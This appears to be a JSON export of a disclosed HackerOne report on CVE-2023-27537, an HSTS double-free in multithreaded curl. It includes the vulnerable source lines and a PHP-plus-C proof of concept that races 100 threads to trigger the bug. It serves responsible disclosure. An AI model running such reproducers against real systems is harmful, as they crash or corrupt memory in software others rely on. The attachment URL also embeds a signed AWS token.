@@ -1,0 +1,136 @@
+{
+  "id": 1897203,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xODk3MjAz",
+  "url": "https://hackerone.com/reports/1897203",
+  "title": "CVE-2023-27537: HSTS double-free",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "low",
+  "readable_substate": "Resolved",
+  "created_at": "2023-03-08T18:10:27.746Z",
+  "submitted_at": "2023-03-08T18:10:27.876Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "kurohiro",
+    "url": "/kurohiro",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 35663,
+    "url": "https://hackerone.com/curl",
+    "handle": "curl",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "curl",
+      "twitter_handle": "",
+      "website": "https://curl.se",
+      "about": "cURL is an Open Source project providing a library and command-line tool doing internet transfers"
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+    "CVE-2023-27537"
+  ],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2023-03-20T11:24:38.300Z",
+  "bug_reporter_agreed_on_going_public_at": "2023-03-20T11:24:38.184Z",
+  "team_member_agreed_on_going_public_at": "2023-03-20T07:59:41.640Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "## Summary:\nWhen processing HSTS with multi-threading, double-free or UAF may occur due to lack of exclusion control.\nHSTS entries disappear when they expire or when \"max-age=0\" is received.\nIn this case, the offending entry is removed from the internal memory list, freeing memory but not exclusivity control.\nTherefore, depending on the timing, other threads may perform the operation, resulting in double-free or UAF.\n\n`lib/hsts.c` in the function `Curl_hsts_parse` on lines 213-221\n```\n  if(!expires) {\n    /* remove the entry if present verbatim (without subdomain match) */\n    sts = Curl_hsts(h, hostname, FALSE);\n    if(sts) {\n      Curl_llist_remove(&h->list, &sts->node, NULL);\n      hsts_free(sts);\n    }\n    return CURLE_OK;\n  }\n```\n\nIf multiple threads process `hsts_free(sts);` at the same time, it becomes double-free.\nAnother problem is that UAF occurs when other threads access entries.\n\nLines 270-275 have a similar problem.\n\n## Steps To Reproduce:\n\n  1. [Prepare the following php.]\n```\n<?php\n$random = rand(0, 1);\nif($random == 0){\n        header(\"strict-transport-security: max-age=9999\");\n}else{\n        header(\"strict-transport-security: max-age=0\");\n}\n```\n  2. [Compile and run the following cpp.]\n```\n#include <stdio.h>\n#define HAVE_STRUCT_TIMESPEC // [Add] \n#include <pthread.h>\n#include <curl/curl.h>\n\n#define NUMT 100\n\nconst char* const url = \"https://test.local/poc.php\";\n\npthread_mutex_t lock[9];\n\nstatic void lock_cb(CURL* handle, curl_lock_data data,\n    curl_lock_access access, void* userptr)\n{\n    pthread_mutex_lock(&lock[data]); /* uses a global lock array */\n}\n\nstatic void unlock_cb(CURL* handle, curl_lock_data data,\n    void* userptr)\n{\n    pthread_mutex_unlock(&lock[data]); /* uses a global lock array */\n}\n\nstatic void* pull_one_url(void* shobject)\n{\n    CURL* curl;\n\n    for (int i = 0; i < 100; i++) {\n        curl = curl_easy_init();\n        curl_easy_setopt(curl, CURLOPT_URL, url);\n        curl_easy_setopt(curl, CURLOPT_HSTS, \"c:\\\\home\\\\hsts.txt\");\n        curl_easy_setopt(curl, CURLOPT_SHARE, shobject);\n        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);\n        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);\n        curl_easy_perform(curl); /* ignores error */\n        curl_easy_cleanup(curl);\n    }\n\n    return NULL;\n}\n\nint main(int argc, char** argv)\n{\n    pthread_t tid[NUMT] = {0};\n    int i;\n\n    for(i = 0;i<=9;i++)\n        pthread_mutex_init(&lock[i], NULL);\n    \n    /* Must initialize libcurl before any threads are started */\n    curl_global_init(CURL_GLOBAL_ALL);\n    CURLSH* shobject = curl_share_init();\n    curl_share_setopt(shobject, CURLSHOPT_SHARE, CURL_LOCK_DATA_HSTS);\n    curl_share_setopt(shobject, CURLSHOPT_LOCKFUNC, lock_cb);\n    curl_share_setopt(shobject, CURLSHOPT_UNLOCKFUNC, unlock_cb);\n    for (i = 0; i < NUMT; i++) {\n        int error = pthread_create(&tid[i],\n            NULL, /* default attributes please */\n            pull_one_url,\n            (void*)shobject);\n        if (0 != error)\n            fprintf(stderr, \"Couldn't run thread number %d, errno %d\\n\", i, error);\n        else\n            fprintf(stderr, \"Thread %d, gets %s\\n\", i, url);\n    }\n\n    /* now wait for all threads to terminate */\n    for (i = 0; i < NUMT; i++) {\n        pthread_join(tid[i], NULL);\n        fprintf(stderr, \"Thread %d terminated\\n\", i);\n    }\n    curl_share_cleanup(shobject);\n    curl_global_cleanup();\n    return 0;\n}\n\n```\nThe source was referred to under docs/examples.\n\nSupplement.\nURL is https://test.local/poc.php.\nphp that randomly memorizes and deletes HSTS entries.\nIt's hard to reproduce if it's random, but I've confirmed that the problem will occur.\nI attach an image of when the UAF happened(I tried in debug build).\nThe number of threads and the number of loops are increased in order to raise the possibility that the phenomenon will occur.\n{F2216003}\n\n## Impact\n\nDouble-free",
+  "weakness": {
+    "id": 49,
+    "name": "Double Free"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 2216003,
+      "file_name": "UAF.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/imsizp0xgfqi0k5ogf1azr575wqm?response-content-disposition=attachment%3B%20filename%3D%22UAF.png%22%3B%20filename%2A%3DUTF-8%27%27UAF.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQXTI3ZXE6%2F20260502%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260502T170027Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHcaCXVzLXdlc3QtMiJGMEQCIAMFDo2Ti7D7PGhpiV4K9rLJIEQ0iTj2aOwjGOf35FtUAiA1A7ZOAnPQlyw17MYgBl0WLJIZ2b%2Bkp6kr5QN9A2Ii1CqyBQhAEAMaDDAxMzYxOTI3NDg0OSIMkgJgRdLBUeNdsbU4Ko8FfIICDE5Zp3Gow0N70LC%2BW54UQbYp3Beoyoz5%2BJ62ADMdZdJ2BJ6UuFFymbMgwMvRe6RqJHp2fcRcJDJ7u2a5OBGf6shAoeH7UKsge61QDnttfHfwqN6VGaQppCCtGO2D3dTJ2J%2F6wWApyw0LkRcoZiMr7oUGKXAyUEEkgKjqS6NdTrSpl9WDYsVOdAA1irnIJ4kZkTGJJiLfxmhxtVRfdzYeiMcfX0EvMClAp9qtKZawyfLcVMZcO27PXsiXE%2B7gIPVG5Q8I1FQ6eSLUMDNMxBpXSKJzGoLb5IkWcpMoTw5cDBYIBZF1ZydD%2FZuu0H%2F2VPaCzf%2BSMuyXTpRYtyD3GFMv15Bpfa%2BgzTsEiw4hgl0eDNsnv4hJRubajMjv9O0h87NzUScxHQsDfIqSHpF9ZhHUDv%2BJ7ZzX7j3muv7H6u%2BM9T1ojiwZ1JVHb1QJWjjf2z%2FtxhvBHLFC3KnA%2FZWycMkNAlZFPr%2Fe1iPhl3RpFOH9uuSWSQ%2BD39QoRMOQQM6LygLAz%2BLn1kZcSxg8Sb9ExDjgMLP3YIRDXfgPbvCx60P1kQvn5Mh7213IeA4lQqiQNB5UvhdB8GQKXSowt60Rux4oRUgazydvxqX%2BcvZhsKYp1v%2BM8nK%2FfSTaZ8oBErDvBl2Pl03rJXF6q2TSz2iJGIqOd79onq8Ex0%2FFbrgaWSF4WqXk8xV2M6eUVx04hbktMO3HCUb7ArjHETAc6b4j55uyQj6mRwsWfUsdkQ0%2BZOGcXVzCiWD0wyxfP3Y6twOMtz0uGWfUYy%2BHw9BGNzOO%2B8vu%2FoPmhNTVR9Kq5dTHy81ZVtvfQ%2FDav3np8mYz8rZm8%2F4jsgC3P1fCntm%2BP9aMgYGKjwvn%2Bj%2FqEyhbjrsK%2FTDHntjPBjqyAYB%2F%2BEVuGpkT2ffQxp%2FSGqr2GT9GMnUs02oWCHARA%2BLd8CGtbaGpsyLGDNODv%2Bzubqq5xUbPK6aXSuSFqTfJLGY2CdieJ7w954ciBo0g%2FXN4x9w4eR4xuQ65528H4AfBY7JdmTo3lG%2Fx6JB6jtlZDQ9rNX8mUtl1LuRjnOhYuMTAWThat5WLNTjeRraqZL5SUAEMJw0h9VfHXCfwi2Vd7aqR9lwslnfl77mrFFi%2BjUz6x4Y%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=395841ae4e3dc98edff0fad6766f49373a768a7ad7a5e5cd6687e01cd611f3db",
+      "file_size": 172456,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2023-04-19T07:59:41.721Z",
+  "allow_singular_disclosure_after": -95850046.15245096,
+  "singular_disclosure_allowed": true,
+  "vote_count": 12,
+  "voters": [
+    "sambamsam",
+    "pentestor",
+    "zy9ard3",
+    "yassinek3ch",
+    "shubham_srt",
+    "jai-kandepu",
+    "shivammusic",
+    "anubis2000",
+    "neimsaci",
+    "log1",
+    "and 2 more..."
+  ],
+  "severity": {
+    "rating": "low",
+    "author_type": "Team"
+  },
+  "structured_scope": {
+    "databaseId": 18844,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://github.com/curl/curl",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
